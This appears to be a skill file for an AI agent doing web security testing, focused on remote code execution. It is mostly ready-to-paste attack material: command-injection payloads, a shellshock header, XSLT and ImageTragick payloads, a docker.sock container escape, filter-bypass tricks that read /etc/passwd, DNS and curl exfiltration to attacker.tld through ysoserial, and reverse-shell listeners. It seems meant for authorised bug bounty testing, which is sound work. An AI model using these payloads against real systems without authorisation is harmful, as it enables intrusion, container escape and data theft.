# SKILL: Remote Code Execution (Command / Eval / Deserialization / Memory / Template / Header)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (remote code execution (command / eval / deserialization / memory / template / header)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
RCE is the apex bug. I scan every input for command-injection sinks; eval; deserialization; XXE-RCE; SSTI-RCE; memory-corruption; header-injection-to-RCE chains.

---

## DETECTION
Inject `;sleep 5`, `&& sleep 5`, `$(sleep 5)`, `\`sleep 5\``, `|sleep 5`, `%0a sleep 5`, `\nsleep 5\n` — measure timing.

## EXPLOITATION
### OS command injection — argv variants
```
;id
&id
|id
&&id
||id
`id`
$(id)
${id}
%0aid
%0a/usr/bin/id
'$(id)'
"$(id)"
\nid\n
%26%26id   (& url-encoded)
```

### Common dangerous functions per language
- **PHP:** `system`, `passthru`, `shell_exec`, `exec`, `popen`, `proc_open`, `eval`, `assert`, `preg_replace('/x/e',...)`, `create_function`, `include`/`require` with user input, `\\backtick`
- **Python:** `os.system`, `subprocess.Popen(... shell=True)`, `eval`, `exec`, `compile`, `pickle.loads`, `yaml.load` (safe_load is OK), `__import__`
- **Node.js:** `child_process.exec` (vs `execFile`), `eval`, `Function('...')`, `vm.runInNewContext`, `require()` user-controlled
- **Java:** `Runtime.exec`, `ProcessBuilder.start`, `ScriptEngine.eval`, ObjectInputStream.readObject, JNDI lookups (Log4Shell)
- **Ruby:** `system`, `\`backtick\``, `Open3.popen3`, `eval`, `instance_eval`, `class_eval`, `Marshal.load`, `YAML.load`
- **Go:** `exec.Command(... "sh","-c", input)` (safe-ish without shell), template/text Execute with controllable template
- **.NET:** `Process.Start`, `cmd /c`, `XmlSerializer` with type confusion, `BinaryFormatter`, `Activator.CreateInstance` from input

### Header-injection RCE (Apache mod_cgi shellshock-style; rare today)
```
User-Agent: () { :;}; /bin/bash -c 'id'
```

### XSLT-based RCE (Saxon / Xalan)
```xml
<xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('id')"/>
```

### Image-magick — old shell metachar (Imagetragick)
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.tld/`id`)'
pop graphic-context
```
(Mostly patched but still alive in legacy on-prem ImageMagick.)

### Container escape via mount of host docker.sock
```
# inside container with /var/run/docker.sock mounted
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## PAYLOADS (real, copy-paste, grouped)
(See above — pick by sink type)

## BYPASS TECHNIQUES
- `ifs` filtering of spaces → `{cat,/etc/passwd}`, `cat$IFS/etc/passwd`, `cat<>/etc/passwd`, `cat${IFS}/etc/passwd`
- Blacklist of `cat` → `tac`, `head`, `tail`, `nl`, `more`, `less`, `c\at`, `'c'a't'`, `c?t`
- Blacklist of `/` → `${PATH:0:1}`, `${HOME:0:1}`, `${PWD:0:1}` (= /), or `cd / && cat etc/passwd`
- Blacklist alphanumeric → POSIX `${0##*/}` (= bash), Bashfuck (no chars at all)
- Blocklist of `;` → `&&`, `||`, `|`, newline `%0a`, `%0d`, `\r\n`
- Length limit → `bash -c {echo,YmFzaCAtaSAmZ}|{base64,-d}|bash`
- Stdout suppressed → use OOB DNS: `nslookup $(whoami).attacker.tld`

## CHAIN POTENTIAL
RCE → service account creds → cloud → cluster → tenant.

## TOOLS
commix (auto), Burp Hackvertor, ysoserial / marshalsec / ysoserial.net for deserialization

## COMMANDS
```bash
# commix
commix -u 'https://target/?cmd=id' --batch

# ysoserial Java
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.tld/$(whoami)' | base64 -w0 > payload.b64

# Reverse shell catcher
nc -lvnp 4444
# OR pwncat
pwncat-cs -lp 4444
```

## EDGE CASES / NOT-A-BUG TRAPS
Modern hardened apps with `execFile`/parameterized exec often feel safe but template engines (SSTI), deserialization, and dependency vulns still bite. Always test deserialization paths.

## TRIAGE ANGLE (per platform)
Always show `id`, `hostname`, `uname -a`, `cat /etc/passwd`. Don't dump customer data. PoC short.

## SEVERITY & CVSS
9.8 (Critical) Auth-less; 8.8 if requires auth.

## REFERENCES
HackTricks RCE • PayloadsAllTheThings/Command Injection • GTFOBins • LOLBAS
